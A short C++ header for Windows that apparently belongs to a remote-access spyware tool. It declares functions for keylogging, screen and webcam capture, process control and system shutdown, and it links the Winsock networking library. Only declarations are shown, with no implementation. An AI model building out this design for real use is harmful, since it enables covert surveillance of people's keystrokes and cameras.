#pragma once
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cwchar>
#include <fstream>
#include <iostream>
#include <mutex>
#include <sstream>
#include <string>
#include <string.h>
#include <thread>
#include <Windows.h>
#include <TlHelp32.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void startKeylogger();
void stopKeylogger();
std::string listProcesses();
bool startProcess(const std::string& path);
bool stopProcess(const std::string& exeName);
bool restartSystem();
bool shutdownSystem();
bool captureScreen(const std::string& filename);
bool captureWebcamPhoto(const std::string& filename);
std::string captureWebcamFrames(int duration);
bool fileExists(const std::string& filename);
